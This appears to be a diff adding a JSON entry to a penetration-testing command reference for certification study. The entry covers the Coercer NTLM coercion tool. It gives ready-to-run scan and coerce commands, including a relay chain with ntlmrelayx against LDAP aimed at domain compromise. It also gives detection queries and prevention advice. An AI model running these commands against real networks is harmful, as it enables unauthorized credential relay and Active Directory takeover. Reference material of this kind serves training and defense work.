@@ -1,0 +1,107 @@
+{
+  "id": "ad-coercer-multi",
+  "name": "Coercer - Multi-Protocol NTLM Coercion Scanner",
+  "command": "python3 Coercer.py coerce -u <user> -p <pass> -d <domain> -t <dc_ip> -l <listener_ip>",
+  "description": "Coercer by p0dalirius is a Swiss-army knife for NTLM coercion. It scans for and exploits multiple coercion methods in one tool: MS-EFSR (PetitPotam), MS-RPRN (PrinterBug), MS-FSRVP (ShadowCoerce), MS-DFSNM (DFSCoerce), and 10+ more RPC interfaces. Run it in scan mode first to find which methods work, then coerce to trigger authentication.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Active Directory",
+  "subcategory": "Coercion & Relay",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "p0dalirius/Coercer; CRTP coercion module",
+  "tags": [
+    "coercer",
+    "ntlm-coercion",
+    "multi-protocol",
+    "petitpotam",
+    "printerbug",
+    "relay"
+  ],
+  "mitre": [
+    "T1187",
+    "T1557.001"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== INSTALL ===\n  pip3 install coercer\n  # Or: git clone https://github.com/p0dalirius/Coercer\n\n=== SCAN MODE (find working methods) ===\n  python3 Coercer.py scan -u <user> -p <pass> -d <domain> -t <dc_ip>\n  # Reports which RPC methods are available\n\n=== COERCE MODE (trigger auth) ===\n  python3 Coercer.py coerce -u <user> -p <pass> -d <domain> -t <dc_ip> -l <listener_ip>\n  # Triggers ALL working methods\n\n=== SPECIFIC METHOD ===\n  python3 Coercer.py coerce -u <user> -p <pass> -d <domain> -t <dc_ip> -l <listener_ip> --filter-method-name EfsRpcOpenFileRaw\n\n=== SUPPORTED PROTOCOLS ===\n  MS-EFSR (PetitPotam)\n  MS-RPRN (PrinterBug)\n  MS-FSRVP (ShadowCoerce)\n  MS-DFSNM (DFSCoerce)\n  MS-EVEN (EventLog)\n  MS-BKRP (BackupKey)\n  And 10+ more\n\n=== RELAY CHAIN ===\n  # Terminal 1: Start relay\n  ntlmrelayx.py -t ldap://<dc_ip> --delegate-access -smb2support\n  # Terminal 2: Coerce\n  python3 Coercer.py coerce -u <user> -p <pass> -d <domain> -t <target> -l <listener_ip>",
+  "examples": [
+    {
+      "label": "Scan for available coercion methods",
+      "command": "python3 Coercer.py scan -u jdoe -p Password123 -d corp.local -t 192.168.1.10"
+    },
+    {
+      "label": "Coerce authentication from DC",
+      "command": "python3 Coercer.py coerce -u jdoe -p Password123 -d corp.local -t 192.168.1.10 -l 192.168.1.50"
+    },
+    {
+      "label": "Use specific method only",
+      "command": "python3 Coercer.py coerce -u jdoe -p Password123 -d corp.local -t 192.168.1.10 -l 192.168.1.50 --filter-method-name EfsRpcOpenFileRaw"
+    }
+  ],
+  "references": [
+    {
+      "title": "Coercer - GitHub",
+      "url": "https://github.com/p0dalirius/Coercer"
+    },
+    {
+      "title": "MITRE T1187 - Forced Authentication",
+      "url": "https://attack.mitre.org/techniques/T1187/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-petitpotam",
+      "note": "PetitPotam is one of the methods Coercer wraps.",
+      "rel": "alternative"
+    },
+    {
+      "id": "ad-dfscoerce",
+      "note": "DFSCoerce is another method Coercer includes.",
+      "rel": "alternative"
+    },
+    {
+      "id": "smb-ntlm-relay",
+      "note": "Relay the coerced auth to LDAP/ADCS for domain compromise.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Multiple Windows RPC services can be abused to trigger NTLM authentication callbacks. Coercer tests all known methods systematically, increasing the chance of finding an exploitable coercion path.",
+    "prerequisites": "Valid domain credentials; network access to target RPC services (TCP 445).",
+    "impact": "Domain compromise when coerced authentication is relayed to ADCS or LDAP.",
+    "detection": "[MITRE T1187] Multiple RPC connection attempts to different service pipes; NTLM authentication from unexpected machine accounts.",
+    "artifacts": "Event 4624 (Type 3) from unexpected sources; named pipe access events; RPC connection logs.",
+    "splunk_spl": "index=sysmon EventCode=18 PipeName IN (\"\\\\*\\pipe\\efsrpc\", \"\\\\*\\pipe\\spoolss\", \"\\\\*\\pipe\\FssagentRpc\", \"\\\\*\\pipe\\netdfs\")\n| stats dc(PipeName) as unique_pipes by Image, SourceIp\n| where unique_pipes > 2",
+    "elastic_kql": "event.code:\"18\" AND file.name:(\"efsrpc\" OR \"spoolss\" OR \"FssagentRpc\" OR \"netdfs\")",
+    "sentinel_kql": "SysmonEvent\n| where EventID == 18\n| where PipeName in (\"\\\\*\\\\pipe\\\\efsrpc\", \"\\\\*\\\\pipe\\\\spoolss\", \"\\\\*\\\\pipe\\\\FssagentRpc\")\n| summarize PipeCount=dcount(PipeName) by SourceIp\n| where PipeCount > 2",
+    "sigma_rules": "sysmon_named_pipe_coercion_multi_protocol",
+    "prevention": "Disable unnecessary RPC services; enforce SMB signing; enable EPA on ADCS; restrict NTLM authentication; monitor for coercion patterns.",
+    "sources": [
+      "CRTP coercion module",
+      "https://attack.mitre.org/techniques/T1187/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Multi-protocol NTLM coercion attempt",
+        "logic": "SysmonEvent\n| where EventID == 18\n| where PipeName has_any (\"efsrpc\", \"spoolss\", \"FssagentRpc\", \"netdfs\", \"eventlog\")\n| summarize UniquePipes=dcount(PipeName), TotalAttempts=count() by SourceIp, bin(TimeGenerated, 5m)\n| where UniquePipes >= 2",
+        "data_source": "sysmon",
+        "log_ids": [
+          "18"
+        ],
+        "attack": [
+          "T1187",
+          "T1557.001"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate RPC operations to multiple services",
+        "tuning": "Alert on 2+ different coercion pipes from the same source in a short window"
+      }
+    ]
+  }
+}
